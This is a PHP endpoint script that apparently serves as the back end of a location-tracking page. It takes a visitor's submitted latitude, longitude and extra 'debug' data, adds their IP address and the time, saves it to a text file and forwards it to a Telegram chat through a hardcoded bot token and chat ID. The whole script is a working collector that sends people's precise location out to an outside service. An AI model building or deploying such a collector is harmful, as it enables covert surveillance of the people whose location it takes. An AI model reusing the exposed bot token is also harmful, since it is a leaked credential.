<?php
require 'vendor/autoload.php';  // Load the Telegram Bot API library

if (isset($_REQUEST['Latitude'], $_REQUEST['Longitude'], $_REQUEST['debug'])) {
    $IP = $_SERVER['REMOTE_ADDR'];
    $date_time = date("l j F Y  g:ia", time() - date("Z"));
    
    $latitude = "Latitude: " . $_REQUEST['Latitude'];
    $longitude = "Longitude: " . $_REQUEST['Longitude'];
    $ip_info = "IP Address: $date_time IP: $IP";
    $data = "Data: " . $_REQUEST['debug'];
    
    $content = "$latitude\n$longitude\n$ip_info\n$data\n";

    $file_path = mt_rand() . ".txt";
    
    $myfile = fopen($file_path, "w") or die("Unable to open file!");
    fwrite($myfile, $content);
    fclose($myfile);
    
    echo "Data saved and sent to Telegram successfully.";
    
    // Send data to Telegram
    $botToken = '6016032432:AAEjURftqkkKIPA1q0nfBbJ003EBwRDU6rs';
    $chatId = '-969881730';
    $message = "$latitude\n$longitude\n$ip_info\n$data";
    
    $telegram = new \Telegram\Bot\Api($botToken);
    $telegram->sendMessage(['chat_id' => $chatId, 'text' => $message]);
} else {
    echo "Required data missing.";
}
?>
